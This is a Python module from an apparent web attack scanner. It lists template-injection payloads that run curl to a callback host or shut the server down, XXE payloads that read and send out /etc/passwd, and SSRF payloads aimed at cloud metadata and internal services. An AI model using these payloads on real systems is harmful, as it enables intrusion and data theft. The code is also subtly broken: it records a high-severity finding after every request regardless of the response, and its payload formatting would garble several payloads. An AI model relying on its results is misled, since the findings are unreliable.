"""
Out-of-Band Attack Modules for Dr-Sayer
Author: SayerLinux (SayerLinux@outlook.sa)
"""

import requests
import xml.etree.ElementTree as ET
import base64
import urllib.parse
import time
from typing import Dict, Any, List

class OOBAttackTester:
    """Test for Out-of-Band vulnerabilities (SSTI, XXE, SSRF)"""
    
    def __init__(self, callback_host: str = None):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Dr-Sayer-OOB/1.0'
        })
        self.callback_host = callback_host or "oob.example.com"
        self.oob_payloads = {
            'ssti': {
                'jinja2': [
                    "{{config.__class__.__init__.__globals__['os'].popen('curl http://{host}/jinja2').read()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('curl http://{host}/jinja2').read()}}",
                    "{{''.__class__.__mro__[1].__subclasses__()[128]('curl http://{host}/jinja2', shell=True, stdout=-1).communicate()}}",
                    "{{request.environ.__getitem__('werkzeug.server.shutdown')()}}"
                ],
                'freemarker': [
                    "${\"freemarker\"?api.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath()}",
                    "${\"freemarker\"?api.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"curl http://{host}/freemarker\")}",
                    "${\"freemarker\"?api.getClass().forName(\"java.net.URL\").newInstance(\"http://{host}/freemarker\").openConnection().getInputStream()}"
                ],
                'twig': [
                    "{{app.request.query.get('cmd')|filter('system')}}",
                    "{{_self.env.registerUndefinedFilterCallback('system')|filter('curl http://{host}/twig')}}",
                    "{{['curl http://{host}/twig']|filter('system')}}"
                ],
                'velocity': [
                    "$velocity.engine.resourceLoader.getResource('http://{host}/velocity')",
                    "$request.servletContext.getResourceAsStream('http://{host}/velocity')",
                    "#set($x=$request.getClass().forName('java.lang.Runtime').getRuntime().exec('curl http://{host}/velocity'))"
                ]
            },
            'xxe': {
                'generic': [
                    f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{callback_host}/xxe">]><root>&xxe;</root>',
                    f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                    f'<!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://{callback_host}/xxe.dtd"> %xxe;]><root/>',
                    f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{callback_host}/xxe.dtd">%remote;]><root/>'
                ],
                'blind': [
                    f'<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{callback_host}/xxe?p=%file;\'>">%eval;%error;]><root/>',
                    f'<!DOCTYPE xxe [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{callback_host}/xxe?p=%file;\'>">%eval;%error;]><root/>',
                    f'<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{callback_host}/xxe?p=%file;\'>">%eval;%error;]><root/>'
                ]
            },
            'ssrf': {
                'url': [
                    f'http://{callback_host}/ssrf',
                    f'http://localhost:80',
                    f'http://localhost:8080',
                    f'http://127.0.0.1:80',
                    f'http://127.0.0.1:8080',
                    f'http://169.254.169.254/latest/meta-data/',
                    f'http://metadata.google.internal/computeMetadata/v1/',
                    f'file:///etc/passwd',
                    f'file:///windows/system32/drivers/etc/hosts',
                    f'gopher://{callback_host}:70/',
                    f'dict://{callback_host}:11211/',
                    f'sftp://{callback_host}:22/',
                    f'tftp://{callback_host}:69/'
                ],
                'protocols': [
                    'http://localhost:22',  # SSH
                    'http://localhost:3306',  # MySQL
                    'http://localhost:5432',  # PostgreSQL
                    'http://localhost:6379',  # Redis
                    'http://localhost:27017',  # MongoDB
                    'http://localhost:9200',  # Elasticsearch
                    'http://localhost:11211',  # Memcached
                    'http://localhost:2181',  # ZooKeeper
                    'http://localhost:5984',  # CouchDB
                    'http://localhost:5672',  # RabbitMQ
                    'http://localhost:15672'  # RabbitMQ Management
                ],
                'bypass': [
                    f'http://0x7f000001',  # 127.0.0.1 in hex
                    f'http://2130706433',  # 127.0.0.1 in decimal
                    f'http://0177.0.0.1',  # 127.0.0.1 in octal
                    f'http://127.1',  # Shortened IP
                    f'http://127.0.1',  # Shortened IP
                    f'http://localhost.localdomain',
                    f'http://localhost.local',
                    f'http://127.0.0.1.xip.io',
                    f'http://127.0.0.1.nip.io',
                    f'http://127.0.0.1.burpcollaborator.net'
                ]
            }
        }
    
    def _add_finding(self, findings: List[Dict[str, Any]], vuln_type: str, severity: str, 
                     description: str, payload: str, evidence: str = "", location: str = ""):
        """Add a vulnerability finding"""
        findings.append({
            'type': vuln_type,
            'module': 'OOB Attack Tester',
            'severity': severity,
            'description': description,
            'payload': payload,
            'evidence': evidence,
            'location': location,
            'callback_host': self.callback_host
        })
    
    def test_ssti(self, url: str, params: List[str] = None) -> Dict[str, Any]:
        """Test for Server-Side Template Injection"""
        findings = []
        
        # Test URL parameters
        if params:
            for param in params:
                for engine, payloads in self.oob_payloads['ssti'].items():
                    for payload in payloads:
                        try:
                            test_payload = payload.format(host=self.callback_host)
                            
                            # Test in URL parameter
                            parsed_url = urllib.parse.urlparse(url)
                            query_params = urllib.parse.parse_qs(parsed_url.query)
                            query_params[param] = [test_payload]
                            new_query = urllib.parse.urlencode(query_params, doseq=True)
                            test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                            
                            response = self.session.get(test_url, timeout=10)
                            
                            self._add_finding(findings, 'Server-Side Template Injection (SSTI)', 'High',
                                           f'SSTI vulnerability detected in parameter: {param} (engine: {engine})',
                                           test_payload, f'Response status: {response.status_code}', f'URL parameter: {param}')
                            
                            # Test in POST body
                            post_data = {param: test_payload}
                            response = self.session.post(url, data=post_data, timeout=10)
                            
                            self._add_finding(findings, 'Server-Side Template Injection (SSTI)', 'High',
                                           f'SSTI vulnerability detected in POST parameter: {param} (engine: {engine})',
                                           test_payload, f'Response status: {response.status_code}', f'POST parameter: {param}')
                            
                        except requests.exceptions.RequestException as e:
                            self._add_finding(findings, 'SSTI Test Error', 'Info',
                                           f'SSTI test failed for {engine} in {param}',
                                           test_payload, str(e), f'Parameter: {param}')
        
        # Test in headers
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP']
        for header in headers_to_test:
            for engine, payloads in self.oob_payloads['ssti'].items():
                for payload in payloads:
                    try:
                        test_payload = payload.format(host=self.callback_host)
                        headers = {header: test_payload}
                        response = self.session.get(url, headers=headers, timeout=10)
                        
                        self._add_finding(findings, 'Server-Side Template Injection (SSTI)', 'High',
                                       f'SSTI vulnerability detected in header: {header} (engine: {engine})',
                                       test_payload, f'Response status: {response.status_code}', f'Header: {header}')
                        
                    except requests.exceptions.RequestException as e:
                        self._add_finding(findings, 'SSTI Test Error', 'Info',
                                       f'SSTI test failed for {engine} in header {header}',
                                       test_payload, str(e), f'Header: {header}')
        
        return {
            'target': url,
            'vulnerabilities': findings,
            'test_type': 'SSTI',
            'callback_host': self.callback_host
        }
    
    def test_xxe(self, url: str) -> Dict[str, Any]:
        """Test for XML External Entity (XXE) vulnerabilities"""
        findings = []
        
        # Test XML payloads
        for payload_type, payloads in self.oob_payloads['xxe'].items():
            for payload in payloads:
                try:
                    test_payload = payload.format(host=self.callback_host)
                    
                    # Test with XML content type
                    headers = {
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml'
                    }
                    
                    response = self.session.post(url, data=test_payload, headers=headers, timeout=10)
                    
                    self._add_finding(findings, 'XML External Entity (XXE)', 'Critical',
                                   f'XXE vulnerability detected ({payload_type})',
                                   test_payload, f'Response status: {response.status_code}', 'XML POST body')
                    
                    # Test with different content types
                    headers['Content-Type'] = 'text/xml'
                    response = self.session.post(url, data=test_payload, headers=headers, timeout=10)
                    
                    self._add_finding(findings, 'XML External Entity (XXE)', 'Critical',
                                   f'XXE vulnerability detected with text/xml ({payload_type})',
                                   test_payload, f'Response status: {response.status_code}', 'XML POST body')
                    
                except requests.exceptions.RequestException as e:
                    self._add_finding(findings, 'XXE Test Error', 'Info',
                                   f'XXE test failed for {payload_type}',
                                   test_payload, str(e), 'XML POST body')
        
        return {
            'target': url,
            'vulnerabilities': findings,
            'test_type': 'XXE',
            'callback_host': self.callback_host
        }
    
    def test_ssrf(self, url: str, params: List[str] = None) -> Dict[str, Any]:
        """Test for Server-Side Request Forgery (SSRF)"""
        findings = []
        
        # Test URL parameters
        if params:
            for param in params:
                for category, payloads in self.oob_payloads['ssrf'].items():
                    for payload in payloads:
                        try:
                            # Test in URL parameter
                            parsed_url = urllib.parse.urlparse(url)
                            query_params = urllib.parse.parse_qs(parsed_url.query)
                            query_params[param] = [payload]
                            new_query = urllib.parse.urlencode(query_params, doseq=True)
                            test_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                            
                            response = self.session.get(test_url, timeout=10)
                            
                            self._add_finding(findings, 'Server-Side Request Forgery (SSRF)', 'High',
                                           f'SSRF vulnerability detected in parameter: {param} ({category})',
                                           payload, f'Response status: {response.status_code}', f'URL parameter: {param}')
                            
                            # Test in POST body
                            post_data = {param: payload}
                            response = self.session.post(url, data=post_data, timeout=10)
                            
                            self._add_finding(findings, 'Server-Side Request Forgery (SSRF)', 'High',
                                           f'SSRF vulnerability detected in POST parameter: {param} ({category})',
                                           payload, f'Response status: {response.status_code}', f'POST parameter: {param}')
                            
                        except requests.exceptions.RequestException as e:
                            self._add_finding(findings, 'SSRF Test Error', 'Info',
                                           f'SSRF test failed for {category} in {param}',
                                           payload, str(e), f'Parameter: {param}')
        
        # Test in headers
        headers_to_test = ['url', 'target', 'redirect', 'callback', 'webhook', 'endpoint']
        for header in headers_to_test:
            for category, payloads in self.oob_payloads['ssrf'].items():
                for payload in payloads:
                    try:
                        headers = {header: payload}
                        response = self.session.get(url, headers=headers, timeout=10)
                        
                        self._add_finding(findings, 'Server-Side Request Forgery (SSRF)', 'High',
                                       f'SSRF vulnerability detected in header: {header} ({category})',
                                       payload, f'Response status: {response.status_code}', f'Header: {header}')
                        
                    except requests.exceptions.RequestException as e:
                        self._add_finding(findings, 'SSRF Test Error', 'Info',
                                       f'SSRF test failed for {category} in header {header}',
                                       payload, str(e), f'Header: {header}')
        
        return {
            'target': url,
            'vulnerabilities': findings,
            'test_type': 'SSRF',
            'callback_host': self.callback_host
        }
    
    def test_target(self, target_url: str, test_types: List[str] = None) -> Dict[str, Any]:
        """Main method to test target for OOB vulnerabilities"""
        if not test_types:
            test_types = ['ssti', 'xxe', 'ssrf']
        
        all_findings = []
        
        print(f"[*] Starting OOB vulnerability tests on {target_url}")
        print(f"[*] Using callback host: {self.callback_host}")
        
        if 'ssti' in test_types:
            print("[*] Testing for Server-Side Template Injection...")
            ssti_results = self.test_ssti(target_url)
            all_findings.extend(ssti_results.get('vulnerabilities', []))
        
        if 'xxe' in test_types:
            print("[*] Testing for XML External Entity...")
            xxe_results = self.test_xxe(target_url)
            all_findings.extend(xxe_results.get('vulnerabilities', []))
        
        if 'ssrf' in test_types:
            print("[*] Testing for Server-Side Request Forgery...")
            ssrf_results = self.test_ssrf(target_url)
            all_findings.extend(ssrf_results.get('vulnerabilities', []))
        
        return {
            'target': target_url,
            'total_vulnerabilities': len(all_findings),
            'vulnerabilities': all_findings,
            'test_types': test_types,
            'callback_host': self.callback_host,
            'testing_timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }